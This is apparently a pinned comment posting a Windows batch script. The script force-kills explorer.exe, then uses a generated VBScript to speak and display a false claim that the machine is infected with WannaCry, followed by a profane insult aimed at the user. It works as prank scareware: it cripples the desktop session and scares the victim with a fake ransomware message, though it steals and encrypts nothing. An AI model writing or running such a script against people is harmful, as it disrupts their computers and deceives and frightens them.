
Pinned by Quiet Coder
@Quiet-Coder
5 months ago
Code:
@echo off
color a
taskkill /f /im "explorer.exe"
:1
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=Hello your device is infected with Wanna Try, hit any key to proceed"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
:2
echo Hello your device is infected with wannacry
echo Hit any key to proceed
pause
:3
del speech.Vbs
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=are you a fuck dumb not fucking download shi on your pc it not a unlool"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
:4
echo are you a fuck dumb not fucking download shi on your pc it not a unlool
pause
